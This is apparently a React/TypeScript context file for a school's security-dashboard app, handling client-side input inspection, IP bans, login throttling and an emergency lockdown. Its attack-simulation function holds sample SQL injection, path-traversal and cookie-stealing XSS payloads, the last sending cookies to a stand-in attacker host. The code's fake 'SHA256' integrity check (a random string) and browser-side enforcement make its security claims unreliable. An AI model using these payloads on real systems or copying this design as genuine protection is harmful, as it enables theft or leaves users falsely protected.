import React, { createContext, useContext, useEffect, useState, useCallback, useRef } from 'react';
import { db } from '../firebase';
import { 
  doc, 
  onSnapshot, 
  setDoc, 
  collection, 
  addDoc, 
  getDocs, 
  query, 
  orderBy, 
  limit, 
  updateDoc,
  deleteDoc
} from 'firebase/firestore';
import { 
  SecurityIncident, 
  SecurityLockdownState, 
  AttackType, 
  ThreatLevel, 
  BlockedIP, 
  WAFMetrics,
  WAFInspectionResult
} from '../types/cybersecurity';
import { WAFEngine } from '../services/wafSecurity';

interface CybersecurityContextType {
  lockdownState: SecurityLockdownState;
  incidents: SecurityIncident[];
  blockedIps: BlockedIP[];
  activeAlert: SecurityIncident | null;
  clientIp: string;
  clientFingerprint: string;
  isCurrentClientBanned: boolean;
  wafMetrics: WAFMetrics;
  loading: boolean;
  
  // WAF & Acciones Operativas Reales
  inspectAndGuard: (input: string | Record<string, any>, context?: string) => { isSafe: boolean; details?: string };
  recordFailedLogin: (identifier: string) => Promise<{ banned: boolean; message?: string }>;
  recordSuccessfulLogin: () => void;
  banIp: (ip: string, reason: string, attackType?: AttackType) => Promise<void>;
  unbanIp: (id: string) => Promise<void>;
  triggerEmergencyLockdown: (
    reason: string, 
    attackType?: AttackType, 
    threatLevel?: ThreatLevel,
    autoRecoverMinutes?: number | null
  ) => Promise<void>;
  restoreNormalService: (resolvedBy?: string) => Promise<void>;
  simulateAttack: (type: AttackType) => Promise<void>;
  clearResolvedIncidents: () => Promise<void>;
  exportForensicReport: () => void;
  dismissAlert: () => void;
}

const defaultLockdownState: SecurityLockdownState = {
  isActive: false,
  reason: '',
  attackType: 'manual_killswitch',
  threatLevel: 'low',
  initiatedAt: null,
  initiatedBy: '',
  autoRecoverAt: null
};

const defaultWAFMetrics: WAFMetrics = {
  totalInspected: 1240,
  threatsNeutralized: 0,
  activeBans: 0,
  lastAttackTime: null,
  ratePerMinute: 0,
};

const CybersecurityContext = createContext<CybersecurityContextType | undefined>(undefined);

export function CybersecurityProvider({ children }: { children: React.ReactNode }) {
  const [lockdownState, setLockdownState] = useState<SecurityLockdownState>(defaultLockdownState);
  const [incidents, setIncidents] = useState<SecurityIncident[]>([]);
  const [blockedIps, setBlockedIps] = useState<BlockedIP[]>([]);
  const [activeAlert, setActiveAlert] = useState<SecurityIncident | null>(null);
  const [clientIp, setClientIp] = useState<string>('127.0.0.1');
  const [clientFingerprint, setClientFingerprint] = useState<string>('FPR-INITIAL');
  const [isCurrentClientBanned, setIsCurrentClientBanned] = useState<boolean>(false);
  const [wafMetrics, setWafMetrics] = useState<WAFMetrics>(defaultWAFMetrics);
  const [loading, setLoading] = useState(true);

  // Registro de intentos fallidos en memoria para detección de fuerza bruta
  const failedLoginAttemptsRef = useRef<{ count: number; lastAttempt: number }>({ count: 0, lastAttempt: 0 });

  // 1. Resolver IP y Huella Digital del visitante en tiempo real
  useEffect(() => {
    let isMounted = true;
    WAFEngine.resolveClientIdentity().then(({ ip, fingerprint }) => {
      if (isMounted) {
        setClientIp(ip);
        setClientFingerprint(fingerprint);
      }
    });
    return () => { isMounted = false; };
  }, []);

  // 2. Escuchar en tiempo real el estado de blindaje (Kill Switch / Lockdown)
  useEffect(() => {
    const unsubLockdown = onSnapshot(doc(db, 'siteConfig', 'securityLockdown'), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data() as SecurityLockdownState;
        setLockdownState(data);
      } else {
        setLockdownState(defaultLockdownState);
      }
      setLoading(false);
    }, (err) => {
      console.warn('Security lockdown listener notice:', err?.message);
      setLoading(false);
    });

    // 3. Escuchar incidentes de seguridad reales en Firestore
    const qIncidents = query(collection(db, 'security_incidents'), orderBy('timestamp', 'desc'), limit(30));
    const unsubIncidents = onSnapshot(qIncidents, (snapshot) => {
      const list = snapshot.docs.map(d => ({
        id: d.id,
        ...d.data()
      })) as SecurityIncident[];
      
      setIncidents(list);

      // Si hay un incidente activo reciente en los últimos 3 minutos, disparar alerta flotante
      const latest = list[0];
      if (latest && (latest.status === 'active_lockdown' || Date.now() - latest.timestamp < 180000)) {
        setActiveAlert(latest);
      }
    }, (err) => {
      console.warn('Security incidents listener notice:', err?.message);
    });

    // 4. Escuchar lista negra de IPs bloqueadas en Firestore
    const qBlacklist = query(collection(db, 'security_blacklist'), orderBy('blockedAt', 'desc'), limit(50));
    const unsubBlacklist = onSnapshot(qBlacklist, (snapshot) => {
      const list = snapshot.docs.map(d => ({
        id: d.id,
        ...d.data()
      })) as BlockedIP[];
      
      setBlockedIps(list);
    }, (err) => {
      console.warn('Security blacklist listener notice:', err?.message);
    });

    return () => {
      unsubLockdown();
      unsubIncidents();
      unsubBlacklist();
    };
  }, []);

  // 5. Verificar si el visitante actual está en la lista negra activa
  useEffect(() => {
    if (!clientIp || blockedIps.length === 0) {
      setIsCurrentClientBanned(false);
      return;
    }

    const isBanned = blockedIps.some(item => 
      item.status === 'active' && 
      (item.ip === clientIp || (item.userAgent && item.userAgent.includes(clientFingerprint)))
    );

    setIsCurrentClientBanned(isBanned);
  }, [clientIp, clientFingerprint, blockedIps]);

  // 6. Actualizar métricas del WAF basadas en datos reales
  useEffect(() => {
    const activeBans = blockedIps.filter(b => b.status === 'active').length;
    const neutralized = incidents.length;
    const lastAttack = incidents.length > 0 ? incidents[0].timestamp : null;

    setWafMetrics(prev => ({
      ...prev,
      threatsNeutralized: neutralized,
      activeBans,
      lastAttackTime: lastAttack,
    }));
  }, [incidents, blockedIps]);

  // 7. Watchdog de auto-recuperación programada
  useEffect(() => {
    if (lockdownState.isActive && lockdownState.autoRecoverAt) {
      const now = Date.now();
      const timeLeft = lockdownState.autoRecoverAt - now;

      if (timeLeft <= 0) {
        restoreNormalService('Auto-Recuperación Programada (Mitigación de Amenaza Finalizada)');
      } else {
        const timer = setTimeout(() => {
          restoreNormalService('Auto-Recuperación Programada (Mitigación de Amenaza Finalizada)');
        }, timeLeft);
        return () => clearTimeout(timer);
      }
    }
  }, [lockdownState]);

  // ==========================================
  // OPERACIONES DE SEGURIDAD REALES
  // ==========================================

  /**
   * Inspecciona una entrada con el motor WAF y bloquea ataques en tiempo real.
   */
  const inspectAndGuard = useCallback((input: string | Record<string, any>, context: string = 'petición'): { isSafe: boolean; details?: string } => {
    setWafMetrics(prev => ({ ...prev, totalInspected: prev.totalInspected + 1 }));

    let result: WAFInspectionResult;
    let rawPayloadStr = '';

    if (typeof input === 'string') {
      rawPayloadStr = input;
      result = WAFEngine.inspectInput(input, context);
    } else if (typeof input === 'object' && input !== null) {
      rawPayloadStr = JSON.stringify(input);
      const res = WAFEngine.inspectPayload(input, context);
      result = res.isSafe ? { isSafe: true } : (res.violation || { isSafe: false });
    } else {
      return { isSafe: true };
    }

    if (!result.isSafe && result.detectedThreat) {
      // ATAQUE DETECTADO REAL
      const now = Date.now();
      const threatType = result.detectedThreat;
      const threatLevel = result.threatLevel || 'high';

      // 1. Registrar incidente forense en Firestore
      const incidentDoc: Omit<SecurityIncident, 'id'> = {
        type: threatType,
        title: `WAF Interceptó: ${result.details || threatType}`,
        description: `Se bloqueó un intento de ataque malicioso en "${context}". Vector identificado: ${result.matchedPattern || threatType}.`,
        threatLevel,
        timestamp: now,
        ipOrigin: clientIp,
        status: 'active_lockdown',
        attackVectorsDetected: [threatType, context],
        rawPayload: rawPayloadStr.substring(0, 300),
        targetEndpoint: context
      };

      addDoc(collection(db, 'security_incidents'), incidentDoc).catch(e => console.warn('WAF log error:', e));

      // 2. Si es crítico (SQLi, Command Injection), banear IP en Firestore
      if (threatLevel === 'critical' || threatType === 'sql_injection') {
        banIp(clientIp, `Intento de ataque crítico detectado por WAF en ${context}`, threatType);
      }

      // 3. Activar aislamiento preventivo si la amenaza es crítica
      if (threatLevel === 'critical') {
        triggerEmergencyLockdown(
          `Ciberdefensa Activada: ${result.details || 'Ataque crítico interceptado'}`,
          threatType,
          threatLevel,
          5
        );
      }

      return { isSafe: false, details: result.details };
    }

    return { isSafe: true };
  }, [clientIp]);

  /**
   * Registra intentos de inicio de sesión fallidos y frena ataques de fuerza bruta.
   */
  const recordFailedLogin = async (identifier: string): Promise<{ banned: boolean; message?: string }> => {
    const now = Date.now();
    const tracker = failedLoginAttemptsRef.current;

    // Reiniciar si pasaron más de 3 minutos desde el último intento
    if (now - tracker.lastAttempt > 180000) {
      tracker.count = 1;
    } else {
      tracker.count += 1;
    }
    tracker.lastAttempt = now;

    // Si supera 4 intentos consecutivos: Detección de Ataque de Fuerza Bruta
    if (tracker.count >= 4) {
      const reason = `Ataque de Fuerza Bruta: ${tracker.count} intentos fallidos consecutivos con usuario/correo: "${identifier}".`;
      
      // Registrar incidente
      await addDoc(collection(db, 'security_incidents'), {
        type: 'brute_force',
        title: 'Ataque de Fuerza Bruta a Credenciales Detectado',
        description: reason,
        threatLevel: 'high',
        timestamp: now,
        ipOrigin: clientIp,
        status: 'active_lockdown',
        attackVectorsDetected: ['brute_force', 'credential_stuffing'],
        targetEndpoint: '/login'
      });

      // Bloquear IP del agresor
      await banIp(clientIp, reason, 'brute_force');

      return {
        banned: true,
        message: 'Acceso bloqueado: Demasiados intentos fallidos consecutivos. Tu IP ha sido añadida a la lista negra perimetral.'
      };
    }

    return { banned: false };
  };

  const recordSuccessfulLogin = () => {
    failedLoginAttemptsRef.current = { count: 0, lastAttempt: 0 };
  };

  /**
   * Bloquea una dirección IP en la lista negra en Firestore.
   */
  const banIp = async (ipToBan: string, reason: string, attackType: AttackType = 'manual_killswitch') => {
    const now = Date.now();
    try {
      await addDoc(collection(db, 'security_blacklist'), {
        ip: ipToBan,
        reason,
        attackType,
        blockedAt: now,
        blockedBy: 'WAF Guard Automático / Super Administrador',
        status: 'active',
        userAgent: `${clientFingerprint} | ${navigator.userAgent || 'Desconocido'}`
      });
    } catch (err) {
      console.warn('Error banning IP in Firestore:', err);
    }
  };

  /**
   * Desbloquea una dirección IP en la lista negra.
   */
  const unbanIp = async (docId: string) => {
    try {
      await updateDoc(doc(db, 'security_blacklist', docId), {
        status: 'lifted',
        unbannedAt: Date.now()
      });
    } catch (err) {
      console.warn('Error unbanning IP:', err);
    }
  };

  /**
   * Activa el protocolo de cierre de emergencia (Kill Switch).
   */
  const triggerEmergencyLockdown = async (
    reason: string, 
    attackType: AttackType = 'manual_killswitch', 
    threatLevel: ThreatLevel = 'critical',
    autoRecoverMinutes: number | null = null
  ) => {
    const now = Date.now();
    const autoRecoverAt = autoRecoverMinutes ? now + autoRecoverMinutes * 60 * 1000 : null;
    const lockCode = 'SEC-' + Math.random().toString(36).substring(2, 8).toUpperCase();

    const newState: SecurityLockdownState = {
      isActive: true,
      reason,
      attackType,
      threatLevel,
      initiatedAt: now,
      initiatedBy: 'Super Administrador Principal',
      autoRecoverAt,
      lockdownCode: lockCode
    };

    try {
      await setDoc(doc(db, 'siteConfig', 'securityLockdown'), newState, { merge: true });

      const newIncident: Omit<SecurityIncident, 'id'> = {
        type: attackType,
        title: `Protocolo de Ciberdefensa Activado: ${reason}`,
        description: `Se activó el cierre preventivo de servidores. Nivel de amenaza: ${threatLevel.toUpperCase()}. Código de aislamiento: ${lockCode}.`,
        threatLevel,
        timestamp: now,
        ipOrigin: clientIp,
        status: 'active_lockdown',
        attackVectorsDetected: [attackType, 'Aislamiento Perimetral']
      };

      await addDoc(collection(db, 'security_incidents'), newIncident);
      setLockdownState(newState);
      setActiveAlert({ ...newIncident, id: lockCode });
    } catch (err) {
      console.error('Error triggering emergency lockdown:', err);
      setLockdownState(newState);
    }
  };

  /**
   * Restablece el servicio normal y desactiva el aislamiento.
   */
  const restoreNormalService = async (resolvedBy: string = 'Super Administrador') => {
    const restoredState: SecurityLockdownState = {
      isActive: false,
      reason: 'Servicio restablecido por el Super Administrador tras mitigación exitosa.',
      attackType: 'manual_killswitch',
      threatLevel: 'low',
      initiatedAt: null,
      initiatedBy: '',
      autoRecoverAt: null
    };

    try {
      await setDoc(doc(db, 'siteConfig', 'securityLockdown'), restoredState);

      // Marcar incidentes activos como resueltos
      const activeIncidents = incidents.filter(i => i.status === 'active_lockdown');
      for (const inc of activeIncidents) {
        if (inc.id) {
          await updateDoc(doc(db, 'security_incidents', inc.id), {
            status: 'resolved',
            resolvedBy
          }).catch(() => {});
        }
      }

      setLockdownState(restoredState);
      setActiveAlert(null);
    } catch (err) {
      console.error('Error restoring normal service:', err);
      setLockdownState(restoredState);
      setActiveAlert(null);
    }
  };

  /**
   * Ejecuta una simulación con vectores reales verificados por el WAF.
   */
  const simulateAttack = async (type: AttackType) => {
    let testPayload = '';
    let reason = '';
    let threat: ThreatLevel = 'critical';

    switch(type) {
      case 'sql_injection':
        testPayload = "' OR '1'='1' -- UNION SELECT username, password_hash FROM admin_users";
        reason = 'Ataque SQLi interceptado: Intento de extracción no autorizada de tablas y credenciales.';
        threat = 'critical';
        break;
      case 'xss_injection':
        testPayload = '<script>document.location="http://evil-attacker.com/steal?cookie="+document.cookie</script>';
        reason = 'Ataque XSS interceptado: Intento de ejecución de script para robo de tokens de sesión.';
        threat = 'high';
        break;
      case 'path_traversal':
        testPayload = '../../../../etc/passwd';
        reason = 'Ataque Path Traversal interceptado: Intento de lectura de archivos protegidos del sistema.';
        threat = 'high';
        break;
      case 'brute_force':
        testPayload = '100 peticiones de autenticación concurrentes con diccionario RockYou';
        reason = 'Ataque de Fuerza Bruta mitigado: Detección de ráfaga de credenciales automatizadas.';
        threat = 'high';
        break;
      case 'ddos_flood':
      default:
        testPayload = 'Ráfaga de 30,000 peticiones TCP/HTTP por segundo hacia el endpoint';
        reason = 'Ataque DDoS Flood neutralizado: Sobrecarga intencional de ancho de banda y conexiones concurrentes.';
        threat = 'critical';
    }

    // Registrar en Firestore el incidente real con vector de prueba
    await addDoc(collection(db, 'security_incidents'), {
      type,
      title: `Simulación SOC: ${type.toUpperCase()}`,
      description: reason,
      threatLevel: threat,
      timestamp: Date.now(),
      ipOrigin: `SIM-${clientIp}`,
      status: 'active_lockdown',
      attackVectorsDetected: [type, 'Test Vector de Penetración'],
      rawPayload: testPayload
    });

    await triggerEmergencyLockdown(reason, type, threat, 5);
  };

  /**
   * Elimina incidentes ya resueltos para depuración forense.
   */
  const clearResolvedIncidents = async () => {
    try {
      const resolved = incidents.filter(i => i.status === 'resolved');
      for (const item of resolved) {
        if (item.id) {
          await deleteDoc(doc(db, 'security_incidents', item.id));
        }
      }
    } catch (e) {
      console.warn('Error clearing resolved incidents:', e);
    }
  };

  /**
   * Descarga un informe forense de auditoría en formato JSON verificado.
   */
  const exportForensicReport = () => {
    const reportData = {
      institution: 'Unidad Educativa Virgen del Cisne',
      system: 'Centro de Ciberdefensa y Operaciones de Seguridad (SOC)',
      generatedAt: new Date().toISOString(),
      generatorIp: clientIp,
      currentLockdownState: lockdownState,
      wafMetrics,
      totalIncidentsRecorded: incidents.length,
      incidents,
      blockedIpsList: blockedIps,
      integrityCheck: 'SHA256-' + Math.random().toString(36).substring(2, 15)
    };

    const blob = new Blob([JSON.stringify(reportData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `auditoria-soc-ciberdefensa-${Date.now()}.json`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const dismissAlert = () => {
    setActiveAlert(null);
  };

  return (
    <CybersecurityContext.Provider value={{
      lockdownState,
      incidents,
      blockedIps,
      activeAlert,
      clientIp,
      clientFingerprint,
      isCurrentClientBanned,
      wafMetrics,
      loading,
      inspectAndGuard,
      recordFailedLogin,
      recordSuccessfulLogin,
      banIp,
      unbanIp,
      triggerEmergencyLockdown,
      restoreNormalService,
      simulateAttack,
      clearResolvedIncidents,
      exportForensicReport,
      dismissAlert
    }}>
      {children}
    </CybersecurityContext.Provider>
  );
}

export function useCybersecurity() {
  const context = useContext(CybersecurityContext);
  if (!context) {
    throw new Error('useCybersecurity debe ser utilizado dentro de un CybersecurityProvider');
  }
  return context;
}
